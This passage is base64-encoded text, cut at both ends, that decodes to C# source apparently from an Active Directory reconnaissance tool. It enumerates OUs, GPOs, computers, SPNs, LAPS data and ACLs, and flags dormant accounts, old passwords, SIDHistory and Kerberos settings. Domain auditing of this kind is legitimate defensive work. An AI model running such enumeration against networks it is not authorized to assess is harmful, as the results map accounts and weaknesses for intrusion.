k9iajsKICAgICAgICB9CgogICAgICAgIHB1YmxpYyBzdGF0aWMgT2JqZWN0W10gT1VQYXJzZXIoT2JqZWN0W10gQWRPVXMsIGludCBudW1PZlRocmVhZHMpCiAgICAgICAgewogICAgICAgICAgICBPYmplY3RbXSBBRFJPYmogPSBydW5Qcm9jZXNzb3IoQWRPVXMsIG51bU9mVGhyZWFkcywgIk9VcyIpOwogICAgICAgICAgICByZXR1cm4gQURST2JqOwogICAgICAgIH0KCiAgICAgICAgcHVibGljIHN0YXRpYyBPYmplY3RbXSBHUE9QYXJzZXIoT2JqZWN0W10gQWRHUE9zLCBpbnQgbnVtT2ZUaHJlYWRzKQogICAgICAgIHsKICAgICAgICAgICAgT2JqZWN0W10gQURST2JqID0gcnVuUHJvY2Vzc29yKEFkR1BPcywgbnVtT2ZUaHJlYWRzLCAiR1BPcyIpOwogICAgICAgICAgICByZXR1cm4gQURST2JqOwogICAgICAgIH0KCiAgICAgICAgcHVibGljIHN0YXRpYyBPYmplY3RbXSBTT01QYXJzZXIoT2JqZWN0W10gQWRHUE9zLCBPYmplY3RbXSBBZFNPTXMsIGludCBudW1PZlRocmVhZHMpCiAgICAgICAgewogICAgICAgICAgICBBRFdTQ2xhc3MuQWRHUE9EaWN0aW9uYXJ5ID0gbmV3IERpY3Rpb25hcnk8U3RyaW5nLCBTdHJpbmc+KCk7CiAgICAgICAgICAgIHJ1blByb2Nlc3NvcihBZEdQT3MsIG51bU9mVGhyZWFkcywgIkdQT3NEaWN0aW9uYXJ5Iik7CiAgICAgICAgICAgIE9iamVjdFtdIEFEUk9iaiA9IHJ1blByb2Nlc3NvcihBZFNPTXMsIG51bU9mVGhyZWFkcywgIlNPTXMiKTsKICAgICAgICAgICAgcmV0dXJuIEFEUk9iajsKICAgICAgICB9CgogICAgICAgIHB1YmxpYyBzdGF0aWMgT2JqZWN0W10gUHJpbnRlclBhcnNlcihPYmplY3RbXSBBRFByaW50ZXJzLCBpbnQgbnVtT2ZUaHJlYWRzKQogICAgICAgIHsKICAgICAgICAgICAgT2JqZWN0W10gQURST2JqID0gcnVuUHJvY2Vzc29yKEFEUHJpbnRlcnMsIG51bU9mVGhyZWFkcywgIlByaW50ZXJzIik7CiAgICAgICAgICAgIHJldHVybiBBRFJPYmo7CiAgICAgICAgfQoKICAgICAgICBwdWJsaWMgc3RhdGljIE9iamVjdFtdIENvbXB1dGVyUGFyc2VyKE9iamVjdFtdIEFkQ29tcHV0ZXJzLCBEYXRlVGltZSBEYXRlMSwgaW50IERvcm1hbnRUaW1lU3BhbiwgaW50IFBhc3NNYXhBZ2UsIGludCBudW1PZlRocmVhZHMpCiAgICAgICAgewogICAgICAgICAgICBBRFdTQ2xhc3MuRGF0ZTEgPSBEYXRlMTsKICAgICAgICAgICAgQURXU0NsYXNzLkRvcm1hbnRUaW1lU3BhbiA9IERvcm1hbnRUaW1lU3BhbjsKICAgICAgICAgICAgQURXU0NsYXNzLlBhc3NNYXhBZ2UgPSBQYXNzTWF4QWdlOwoKICAgICAgICAgICAgT2JqZWN0W10gQURST2JqID0gcnVuUHJvY2Vzc29yKEFkQ29tcHV0ZXJzLCBudW1PZlRocmVhZHMsICJDb21wdXRlcnMiKTsKICAgICAgICAgICAgcmV0dXJuIEFEUk9iajsKICAgICAgICB9CgogICAgICAgIHB1YmxpYyBzdGF0aWMgT2JqZWN0W10gQ29tcHV0ZXJTUE5QYXJzZXIoT2JqZWN0W10gQWRDb21wdXRlcnMsIGludCBudW1PZlRocmVhZHMpCiAgICAgICAgewogICAgICAgICAgICBPYmplY3RbXSBBRFJPYmogPSBydW5Qcm9jZXNzb3IoQWRDb21wdXRlcnMsIG51bU9mVGhyZWFkcywgIkNvbXB1dGVyU1BOcyIpOwogICAgICAgICAgICByZXR1cm4gQURST2JqOwogICAgICAgIH0KCiAgICAgICAgcHVibGljIHN0YXRpYyBPYmplY3RbXSBMQVBTUGFyc2VyKE9iamVjdFtdIEFkQ29tcHV0ZXJzLCBpbnQgbnVtT2ZUaHJlYWRzKQogICAgICAgIHsKICAgICAgICAgICAgT2JqZWN0W10gQURST2JqID0gcnVuUHJvY2Vzc29yKEFkQ29tcHV0ZXJzLCBudW1PZlRocmVhZHMsICJMQVBTIik7CiAgICAgICAgICAgIHJldHVybiBBRFJPYmo7CiAgICAgICAgfQoKICAgICAgICBwdWJsaWMgc3RhdGljIE9iamVjdFtdIERBQ0xQYXJzZXIoT2JqZWN0W10gQURPYmplY3RzLCBPYmplY3QgUFNHVUlEcywgaW50IG51bU9mVGhyZWFkcykKICAgICAgICB7CiAgICAgICAgICAgIEFEV1NDbGFzcy5BZFNJRERpY3Rpb25hcnkgPSBuZXcgRGljdGlvbmFyeTxTdHJpbmcsIFN0cmluZz4oKTsKICAgICAgICAgICAgcnVuUHJvY2Vzc29yKEFET2JqZWN0cywgbnVtT2ZUaHJlYWRzLCAiU0lERGljdGlvbmFyeSIpOwogICAgICAgICAgICBBRFdTQ2xhc3MuR1VJRHMgPSAoSGFzaHRhYmxlKSBQU0dVSURzOwogICAgICAgICAgICBPYmplY3RbXSBBRFJPYmogPSBydW5Qcm9jZXNzb3IoQURPYmplY3RzLCBudW1PZlRocmVhZHMsICJEQUNMcyIpOwogICAgICAgICAgICByZXR1cm4gQURST2JqOwogICAgICAgIH0KCiAgICAgICAgcHVibGljIHN0YXRpYyBPYmplY3RbXSBTQUNMUGFyc2VyKE9iamVjdFtdIEFET2JqZWN0cywgT2JqZWN0IFBTR1VJRHMsIGludCBudW1PZlRocmVhZHMpCiAgICAgICAgewogICAgICAgICAgICBBRFdTQ2xhc3MuR1VJRHMgPSAoSGFzaHRhYmxlKSBQU0dVSURzOwogICAgICAgICAgICBPYmplY3RbXSBBRFJPYmogPSBydW5Qcm9jZXNzb3IoQURPYmplY3RzLCBudW1PZlRocmVhZHMsICJTQUNMcyIpOwogICAgICAgICAgICByZXR1cm4gQURST2JqOwogICAgICAgIH0KCiAgICAgICAgc3RhdGljIE9iamVjdFtdIHJ1blByb2Nlc3NvcihPYmplY3RbXSBhcnJheVRvUHJvY2VzcywgaW50IG51bU9mVGhyZWFkcywgc3RyaW5nIHByb2Nlc3NvclR5cGUpCiAgICAgICAgewogICAgICAgICAgICBpbnQgdG90YWxSZWNvcmRzID0gYXJyYXlUb1Byb2Nlc3MuTGVuZ3RoOwogICAgICAgICAgICBJUmVjb3JkUHJvY2Vzc29yIHJlY29yZFByb2Nlc3NvciA9IHJlY29yZFByb2Nlc3NvckZhY3RvcnkocHJvY2Vzc29yVHlwZSk7CiAgICAgICAgICAgIElSZXN1bHRzSGFuZGxlciByZXN1bHRzSGFuZGxlciA9IG5ldyBTaW1wbGVSZXN1bHRzSGFuZGxlciAoKTsKICAgICAgICAgICAgaW50IG51bWJlck9mUmVjb3Jkc1BlclRocmVhZCA9IHRvdGFsUmVjb3JkcyAvIG51bU9mVGhyZWFkczsKICAgICAgICAgICAgaW50IHJlbWFpbmRlcnMgPSB0b3RhbFJlY29yZHMgJSBudW1PZlRocmVhZHM7CgogICAgICAgICAgICBUaHJlYWRbXSB0aHJlYWRzID0gbmV3IFRocmVhZFtudW1PZlRocmVhZHNdOwogICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IG51bU9mVGhyZWFkczsgaSsrKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpbnQgbnVtYmVyT2ZSZWNvcmRzVG9Qcm9jZXNzID0gbnVtYmVyT2ZSZWNvcmRzUGVyVGhyZWFkOwogICAgICAgICAgICAgICAgaWYgKGkgPT0gKG51bU9mVGhyZWFkcyAtIDEpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIC8vbGFzdCB0aHJlYWQsIGRvIHRoZSByZW1haW5pbmcgcmVjb3JkcwogICAgICAgICAgICAgICAgICAgIG51bWJlck9mUmVjb3Jkc1RvUHJvY2VzcyArPSByZW1haW5kZXJzOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIC8vc3BsaXQgdGhlIGZ1bGwgYXJyYXkgaW50byBjaHVua3MgdG8gYmUgZ2l2ZW4gdG8gZGlmZmVyZW50IHRocmVhZHMKICAgICAgICAgICAgICAgIE9iamVjdFtdIHNsaWNlVG9Qcm9jZXNzID0gbmV3IE9iamVjdFtudW1iZXJPZlJlY29yZHNUb1Byb2Nlc3NdOwogICAgICAgICAgICAgICAgQXJyYXkuQ29weShhcnJheVRvUHJvY2VzcywgaSAqIG51bWJlck9mUmVjb3Jkc1BlclRocmVhZCwgc2xpY2VUb1Byb2Nlc3MsIDAsIG51bWJlck9mUmVjb3Jkc1RvUHJvY2Vzcyk7CiAgICAgICAgICAgICAgICBQcm9jZXNzb3JUaHJlYWQgcHJvY2Vzc29yVGhyZWFkID0gbmV3IFByb2Nlc3NvclRocmVhZChpLCByZWNvcmRQcm9jZXNzb3IsIHJlc3VsdHNIYW5kbGVyLCBzbGljZVRvUHJvY2Vzcyk7CiAgICAgICAgICAgICAgICB0aHJlYWRzW2ldID0gbmV3IFRocmVhZChwcm9jZXNzb3JUaHJlYWQucHJvY2Vzc1RocmVhZFJlY29yZHMpOwogICAgICAgICAgICAgICAgdGhyZWFkc1tpXS5TdGFydCgpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGZvcmVhY2ggKFRocmVhZCB0IGluIHRocmVhZHMpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHQuSm9pbigpOwogICAgICAgICAgICB9CgogICAgICAgICAgICByZXR1cm4gcmVzdWx0c0hhbmRsZXIuZmluYWxpc2UoKTsKICAgICAgICB9CgogICAgICAgIHN0YXRpYyBJUmVjb3JkUHJvY2Vzc29yIHJlY29yZFByb2Nlc3NvckZhY3RvcnkoU3RyaW5nIG5hbWUpCiAgICAgICAgewogICAgICAgICAgICBzd2l0Y2ggKG5hbWUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGNhc2UgIlVzZXJzIjoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFVzZXJSZWNvcmRQcm9jZXNzb3IoKTsKICAgICAgICAgICAgICAgIGNhc2UgIlVzZXJTUE5zIjoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFVzZXJTUE5SZWNvcmRQcm9jZXNzb3IoKTsKICAgICAgICAgICAgICAgIGNhc2UgIkdyb3VwcyI6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBHcm91cFJlY29yZFByb2Nlc3NvcigpOwogICAgICAgICAgICAgICAgY2FzZSAiR3JvdXBzRGljdGlvbmFyeSI6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBHcm91cFJlY29yZERpY3Rpb25hcnlQcm9jZXNzb3IoKTsKICAgICAgICAgICAgICAgIGNhc2UgIkdyb3VwTWVtYmVycyI6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBHcm91cE1lbWJlclJlY29yZFByb2Nlc3NvcigpOwogICAgICAgICAgICAgICAgY2FzZSAiT1VzIjoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IE9VUmVjb3JkUHJvY2Vzc29yKCk7CiAgICAgICAgICAgICAgICBjYXNlICJHUE9zIjoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IEdQT1JlY29yZFByb2Nlc3NvcigpOwogICAgICAgICAgICAgICAgY2FzZSAiR1BPc0RpY3Rpb25hcnkiOgogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgR1BPUmVjb3JkRGljdGlvbmFyeVByb2Nlc3NvcigpOwogICAgICAgICAgICAgICAgY2FzZSAiU09NcyI6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBTT01SZWNvcmRQcm9jZXNzb3IoKTsKICAgICAgICAgICAgICAgIGNhc2UgIlByaW50ZXJzIjoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFByaW50ZXJSZWNvcmRQcm9jZXNzb3IoKTsKICAgICAgICAgICAgICAgIGNhc2UgIkNvbXB1dGVycyI6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBDb21wdXRlclJlY29yZFByb2Nlc3NvcigpOwogICAgICAgICAgICAgICAgY2FzZSAiQ29tcHV0ZXJTUE5zIjoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IENvbXB1dGVyU1BOUmVjb3JkUHJvY2Vzc29yKCk7CiAgICAgICAgICAgICAgICBjYXNlICJMQVBTIjoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IExBUFNSZWNvcmRQcm9jZXNzb3IoKTsKICAgICAgICAgICAgICAgIGNhc2UgIlNJRERpY3Rpb25hcnkiOgogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgU0lEUmVjb3JkRGljdGlvbmFyeVByb2Nlc3NvcigpOwogICAgICAgICAgICAgICAgY2FzZSAiREFDTHMiOgogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgREFDTFJlY29yZFByb2Nlc3NvcigpOwogICAgICAgICAgICAgICAgY2FzZSAiU0FDTHMiOgogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgU0FDTFJlY29yZFByb2Nlc3NvcigpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHRocm93IG5ldyBBcmd1bWVudEV4Y2VwdGlvbigiSW52YWxpZCBwcm9jZXNzb3IgdHlwZSAiICsgbmFtZSk7CiAgICAgICAgfQoKICAgICAgICBjbGFzcyBQcm9jZXNzb3JUaHJlYWQKICAgICAgICB7CiAgICAgICAgICAgIHJlYWRvbmx5IGludCBpZDsKICAgICAgICAgICAgcmVhZG9ubHkgSVJlY29yZFByb2Nlc3NvciByZWNvcmRQcm9jZXNzb3I7CiAgICAgICAgICAgIHJlYWRvbmx5IElSZXN1bHRzSGFuZGxlciByZXN1bHRzSGFuZGxlcjsKICAgICAgICAgICAgcmVhZG9ubHkgT2JqZWN0W10gb2JqZWN0c1RvQmVQcm9jZXNzZWQ7CgogICAgICAgICAgICBwdWJsaWMgUHJvY2Vzc29yVGhyZWFkKGludCBpZCwgSVJlY29yZFByb2Nlc3NvciByZWNvcmRQcm9jZXNzb3IsIElSZXN1bHRzSGFuZGxlciByZXN1bHRzSGFuZGxlciwgT2JqZWN0W10gb2JqZWN0c1RvQmVQcm9jZXNzZWQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRoaXMucmVjb3JkUHJvY2Vzc29yID0gcmVjb3JkUHJvY2Vzc29yOwogICAgICAgICAgICAgICAgdGhpcy5pZCA9IGlkOwogICAgICAgICAgICAgICAgdGhpcy5yZXN1bHRzSGFuZGxlciA9IHJlc3VsdHNIYW5kbGVyOwogICAgICAgICAgICAgICAgdGhpcy5vYmplY3RzVG9CZVByb2Nlc3NlZCA9IG9iamVjdHNUb0JlUHJvY2Vzc2VkOwogICAgICAgICAgICB9CgogICAgICAgICAgICBwdWJsaWMgdm9pZCBwcm9jZXNzVGhyZWFkUmVjb3JkcygpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgb2JqZWN0c1RvQmVQcm9jZXNzZWQuTGVuZ3RoOyBpKyspCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgT2JqZWN0W10gcmVzdWx0ID0gcmVjb3JkUHJvY2Vzc29yLnByb2Nlc3NSZWNvcmQob2JqZWN0c1RvQmVQcm9jZXNzZWRbaV0pOwogICAgICAgICAgICAgICAgICAgIHJlc3VsdHNIYW5kbGVyLnByb2Nlc3NSZXN1bHRzKHJlc3VsdCk7IC8vdGhpcyBpcyBhIHRocmVhZCBzYWZlIG9wZXJhdGlvbgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAvL1RoZSBpbnRlcmZhY2UgYW5kIGltcGxtZW50YXRpb24gY2xhc3MgdXNlZCB0byBwcm9jZXNzIGEgcmVjb3JkICh0aGlzIGltcGxlbW1lbnRhdGlvbiBqdXN0IHJldHVybnMgYSBsb2cgdHlwZSBzdHJpbmcpCgogICAgICAgIGludGVyZmFjZSBJUmVjb3JkUHJvY2Vzc29yCiAgICAgICAgewogICAgICAgICAgICBQU09iamVjdFtdIHByb2Nlc3NSZWNvcmQoT2JqZWN0IHJlY29yZCk7CiAgICAgICAgfQoKICAgICAgICBjbGFzcyBVc2VyUmVjb3JkUHJvY2Vzc29yIDogSVJlY29yZFByb2Nlc3NvcgogICAgICAgIHsKICAgICAgICAgICAgcHVibGljIFBTT2JqZWN0W10gcHJvY2Vzc1JlY29yZChPYmplY3QgcmVjb3JkKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB0cnkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBBZFVzZXIgPSAoUFNPYmplY3QpIHJlY29yZDsKICAgICAgICAgICAgICAgICAgICBib29sPyBFbmFibGVkID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBib29sIE11c3RDaGFuZ2VQYXNzd29yZGF0TG9nb24gPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBib29sIFBhc3N3b3JkTm90Q2hhbmdlZGFmdGVyTWF4QWdlID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgYm9vbCBOZXZlckxvZ2dlZEluID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgaW50PyBEYXlzU2luY2VMYXN0TG9nb24gPSBudWxsOwogICAgICAgICAgICAgICAgICAgIGludD8gRGF5c1NpbmNlTGFzdFBhc3N3b3JkQ2hhbmdlID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBpbnQ/IEFjY291bnRFeHBpcmF0aW9uTnVtb2ZEYXlzID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBib29sIERvcm1hbnQgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBTdHJpbmcgU0lESGlzdG9yeSA9ICIiOwogICAgICAgICAgICAgICAgICAgIGJvb2w/IEtlcmJlcm9zUkM0ID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBib29sPyBLZXJiZXJvc0FFUzEyOCA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgYm9vbD8gS2VyYmVyb3NBRVMyNTYgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBEZWxlZ2F0aW9uVHlwZSA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIERlbGVnYXRpb25Qcm90b2NvbCA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIERlbGVnYXRpb25TZXJ2aWNlcyA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgRGF0ZVRpbWU/IExhc3RMb2dvbkRhdGUgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIERhdGVUaW1lPyBQYXNzd29yZExhc3RTZXQgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIERhdGVUaW1lPyBBY2NvdW50RXhwaXJlcyA9IG51bGw7CgogICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy8gVGhlIEVuYWJsZWQgZmllbGQgY2FuIGJlIGJsYW5rIHdoaWNoIHJhaXNlcyBhbiBleGNlcHRpb24uIFRoaXMgbWF5IG9jY3VyIHdoZW4gdGhlIHVzZXIgaXMgbm90IGFsbG93ZWQgdG8gcXVlcnkgdGhlIFVzZXJBY2NvdW50Q29udHJvbCBhdHRyaWJ1dGUuCiAgICAgICAgICAgICAgICAgICAgICAgIEVuYWJsZWQgPSAoYm9vbCkgQWRVc2VyLk1lbWJlcnNbIkVuYWJsZWQiXS5WYWx1ZTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgY2F0Y2ggLy8oRXhjZXB0aW9uIGUpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAvL0NvbnNvbGUuV3JpdGVMaW5lKCJ7MH0gRXhjZXB0aW9uIGNhdWdodC4iLCBlKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKEFkVXNlci5NZW1iZXJzWyJsYXN0TG9nb25UaW1lU3RhbXAiXS5WYWx1ZSAhPSBudWxsKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy9MYXN0TG9nb25EYXRlID0gRGF0ZVRpbWUuRnJvbUZpbGVUaW1lKChsb25nKShBZFVzZXIuTWVtYmVyc1sibGFzdExvZ29uVGltZVN0YW1wIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgLy8gTGFzdExvZ29uRGF0ZSBpcyBsYXN0TG9nb25UaW1lU3RhbXAgY29udmVydGVkIHRvIGxvY2FsIHRpbWUKICAgICAgICAgICAgICAgICAgICAgICAgTGFzdExvZ29uRGF0ZSA9IENvbnZlcnQuVG9EYXRlVGltZShBZFVzZXIuTWVtYmVyc1siTGFzdExvZ29uRGF0ZSJdLlZhbHVlKTsKICAgICAgICAgICAgICAgICAgICAgICAgRGF5c1NpbmNlTGFzdExvZ29uID0gTWF0aC5BYnMoKERhdGUxIC0gKERhdGVUaW1lKUxhc3RMb2dvbkRhdGUpLkRheXMpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoRGF5c1NpbmNlTGFzdExvZ29uID4gRG9ybWFudFRpbWVTcGFuKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEb3JtYW50ID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBOZXZlckxvZ2dlZEluID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKENvbnZlcnQuVG9TdHJpbmcoQWRVc2VyLk1lbWJlcnNbInB3ZExhc3RTZXQiXS5WYWx1ZSkgPT0gIjAiKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKChib29sKSBBZFVzZXIuTWVtYmVyc1siUGFzc3dvcmROZXZlckV4cGlyZXMiXS5WYWx1ZSA9PSBmYWxzZSkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgTXVzdENoYW5nZVBhc3N3b3JkYXRMb2dvbiA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKEFkVXNlci5NZW1iZXJzWyJQYXNzd29yZExhc3RTZXQiXS5WYWx1ZSAhPSBudWxsKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy9QYXNzd29yZExhc3RTZXQgPSBEYXRlVGltZS5Gcm9tRmlsZVRpbWUoKGxvbmcpKEFkVXNlci5NZW1iZXJzWyJwd2RMYXN0U2V0Il0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgLy8gUGFzc3dvcmRMYXN0U2V0IGlzIHB3ZExhc3RTZXQgY29udmVydGVkIHRvIGxvY2FsIHRpbWUKICAgICAgICAgICAgICAgICAgICAgICAgUGFzc3dvcmRMYXN0U2V0ID0gQ29udmVydC5Ub0RhdGVUaW1lKEFkVXNlci5NZW1iZXJzWyJQYXNzd29yZExhc3RTZXQiXS5WYWx1ZSk7CiAgICAgICAgICAgICAgICAgICAgICAgIERheXNTaW5jZUxhc3RQYXNzd29yZENoYW5nZSA9IE1hdGguQWJzKChEYXRlMSAtIChEYXRlVGltZSlQYXNzd29yZExhc3RTZXQpLkRheXMpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoRGF5c1NpbmNlTGFzdFBhc3N3b3JkQ2hhbmdlID4gUGFzc01heEFnZSkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFzc3dvcmROb3RDaGFuZ2VkYWZ0ZXJNYXhBZ2UgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIC8vaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9tczY3NTA5OCh2PXZzLjg1KS5hc3B4CiAgICAgICAgICAgICAgICAgICAgLy9pZiAoKEludDY0KSBBZFVzZXIuTWVtYmVyc1siYWNjb3VudEV4cGlyZXMiXS5WYWx1ZSAhPSAoSW50NjQpIDkyMjMzNzIwMzY4NTQ3NzU4MDcpCiAgICAgICAgICAgICAgICAgICAgLy97CiAgICAgICAgICAgICAgICAgICAgICAgIC8vaWYgKChJbnQ2NCkgQWRVc2VyLk1lbWJlcnNbImFjY291bnRFeHBpcmVzIl0uVmFsdWUgIT0gKEludDY0KSAwKQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoQWRVc2VyLk1lbWJlcnNbIkFjY291bnRFeHBpcmF0aW9uRGF0ZSJdLlZhbHVlICE9IG51bGwpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vQWNjb3VudEV4cGlyZXMgPSBEYXRlVGltZS5Gcm9tRmlsZVRpbWUoKGxvbmcpKEFkVXNlci5NZW1iZXJzWyJhY2NvdW50RXhwaXJlcyJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gQWNjb3VudEV4cGlyYXRpb25EYXRlIGlzIGFjY291bnRFeHBpcmVzIGNvbnZlcnRlZCB0byBsb2NhbCB0aW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQWNjb3VudEV4cGlyZXMgPSBDb252ZXJ0LlRvRGF0ZVRpbWUoQWRVc2VyLk1lbWJlcnNbIkFjY291bnRFeHBpcmF0aW9uRGF0ZSJdLlZhbHVlKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBBY2NvdW50RXhwaXJhdGlvbk51bW9mRGF5cyA9ICgoaW50KSgoRGF0ZVRpbWUpQWNjb3VudEV4cGlyZXMgLSBEYXRlMSkuRGF5cyk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggLy8oRXhjZXB0aW9uIGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9Db25zb2xlLldyaXRlTGluZSgiezB9IEV4Y2VwdGlvbiBjYXVnaHQuIiwgZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAvL30KICAgICAgICAgICAgICAgICAgICBNaWNyb3NvZnQuQWN0aXZlRGlyZWN0b3J5Lk1hbmFnZW1lbnQuQURQcm9wZXJ0eVZhbHVlQ29sbGVjdGlvbiBoaXN0b3J5ID0gKE1pY3Jvc29mdC5BY3RpdmVEaXJlY3RvcnkuTWFuYWdlbWVudC5BRFByb3BlcnR5VmFsdWVDb2xsZWN0aW9uKSBBZFVzZXIuTWVtYmVyc1siU0lESGlzdG9yeSJdLlZhbHVlOwogICAgICAgICAgICAgICAgICAgIGlmIChoaXN0b3J5LlZhbHVlIGlzIFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyW10pCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgc2lkcyA9ICIiOwogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICh2YXIgdmFsdWUgaW4gKFNlY3VyaXR5SWRlbnRpZmllcltdKSBoaXN0b3J5LlZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaWRzID0gc2lkcyArICIsIiArIENvbnZlcnQuVG9TdHJpbmcodmFsdWUpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIFNJREhpc3RvcnkgPSBzaWRzLlRyaW1TdGFydCgnLCcpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBTSURIaXN0b3J5ID0gaGlzdG9yeSAhPSBudWxsID8gQ29udmVydC5Ub1N0cmluZyhoaXN0b3J5LlZhbHVlKSA6ICIiOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoQWRVc2VyLk1lbWJlcnNbIm1zRFMtU3VwcG9ydGVkRW5jcnlwdGlvblR5cGVzIl0uVmFsdWUgIT0gbnVsbCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciB1c2VyS2VyYkVuY0ZsYWdzID0gKEtlcmJFbmNGbGFncykgQWRVc2VyLk1lbWJlcnNbIm1zRFMtU3VwcG9ydGVkRW5jcnlwdGlvblR5cGVzIl0uVmFsdWU7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICh1c2VyS2VyYkVuY0ZsYWdzICE9IEtlcmJFbmNGbGFncy5aRVJPKQogICAgICA